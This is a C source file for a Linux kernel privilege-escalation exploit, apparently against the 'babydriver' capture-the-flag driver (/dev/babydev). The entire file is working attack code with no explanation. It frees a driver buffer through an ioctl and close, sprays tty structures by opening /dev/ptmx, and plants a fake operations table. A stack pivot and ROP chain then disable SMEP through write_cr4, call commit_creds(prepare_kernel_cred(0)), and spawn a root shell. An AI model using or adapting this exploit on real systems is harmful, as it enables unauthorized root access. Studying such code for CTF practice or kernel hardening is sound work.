#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#define CRED_SIZE 0xa8
#define TTY_STRUCT_SIZE 0x2e0
#define PTMX "/dev/ptmx"

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
_commit_creds __commit_creds = 0xffffffff810a1420;
_prepare_kernel_cred __prepare_kernel_cred = 0xffffffff810a1810;

unsigned long user_cs, user_ss, user_eflags;

unsigned long write_cr4 = 0xffffffff810635b4;
//unsigned long write_cr4 = 0xffffffff810635b0;
unsigned long poprdiret = 0xffffffff810d238d;
unsigned long xchgeaxesp = 0xffffffff81007808;
unsigned long stack ;
int fd_array[0x20];

void save_user_state(){
    asm(
       "movq %%cs, %0\n"
       "movq %%ss, %1\n"
       "pushfq\n"
       "popq %2\n"
       : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags)
       :
       : "memory"
       );
}

void get_shell(){
    system("/bin/sh");
}
void get_root(){
    __commit_creds(__prepare_kernel_cred(0));
    asm(
        "swapgs\n"
        "movq %0,%%rax\n"    // push things into stack for iretq
        "pushq %%rax\n"
        "movq %1,%%rax\n"
        "pushq %%rax\n"
        "movq %2,%%rax\n"
        "pushq %%rax\n"
        "movq %3,%%rax\n"
        "pushq %%rax\n"
        "movq %4,%%rax\n"
        "pushq %%rax\n"
        "iretq\n"
        :
        :"r"(user_ss),"r"(stack - 0x808 + 0x2000),"r"(user_eflags),"r"(user_cs),"r"(get_shell)
        :"memory"
       );
}

int main(){
    int fd1, fd2;

    char buffer[0x20];
    long fake_ops[0x30];
    memset(fake_ops, 0, sizeof(fake_ops));
    fake_ops[12] = xchgeaxesp;
    fd1 = open("/dev/babydev", O_RDWR);
    fd2 = open("/dev/babydev", O_RDWR);

    ioctl(fd1, 0x10001, TTY_STRUCT_SIZE);
    close(fd1);

    for(int i = 0; i < 0x20; i++){
        fd_array[i] = open(PTMX, O_RDWR);
    }

    read(fd2, buffer, 0x20);
    *((long*)(buffer+0x18)) = (long)fake_ops;
    write(fd2, buffer, 0x20);

    stack = xchgeaxesp & 0xFFFFFFFF;
    unsigned long res = 0;
    if(mmap(stack - 0x808, 0x6000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) != (stack-0x808)){
        puts("Mmap failed!");
        exit(0);
    }

    unsigned long rop_chain[] ={
        poprdiret,
        0x6f0,
        write_cr4,
        stack- 0x808 + 0x4000,
        (unsigned long)get_root,

    };
    memcpy(stack, rop_chain, sizeof(rop_chain));
    getchar();
    
    save_user_state();
    for(int i = 0; i< 0x20; i++){
        ioctl(fd_array[i], 0xdeadbeef, 0xcafebabe);
    }

    return 0;
}
